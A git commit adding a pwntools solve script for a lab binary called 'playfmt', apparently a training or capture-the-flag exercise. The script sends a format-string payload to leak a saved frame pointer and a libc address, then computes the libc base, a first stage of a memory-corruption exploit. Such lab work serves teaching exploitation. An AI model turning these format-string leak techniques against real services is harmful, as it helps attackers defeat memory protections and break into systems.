9c5b86b07b5405f4054aac0614d02c6059952adc
M4xW4n9 <aboultraman@gmail.com>
2018-05-24 22:56:04 +0800

    fsb in bss

--- LAB/lab9/solve.py
+++ LAB/lab9/solve.py
@@ -3,8 +3,27 @@
 __Auther__ = 'M4x'
 
 from pwn import *
+context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+
 
 io = process("./playfmt")
 elf = ELF("./playfmt")
+libc = elf.libc
 
+def DEBUG(cmd = ""):
+    raw_input("DEBUG: ")
+    gdb.attach(io, cmd)
 
+#  DEBUG("b *0x804853B\n/c")
+io.send("||%6$p||%8$p||")
+io.recvuntil("||")
+playEbp = int(io.recvuntil("||", drop = True), 16)
+do_fmtEbp = playEbp - 0x10
+success("playEbp -> {:#x}".format(playEbp))
+success("do_fmtEbp -> {:#x}".format(do_fmtEbp))
+libcBase = int(io.recvuntil("||", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
+success("libcBase -> {:#x}".format(libcBase))
+
+io.interactive()
+io.close()
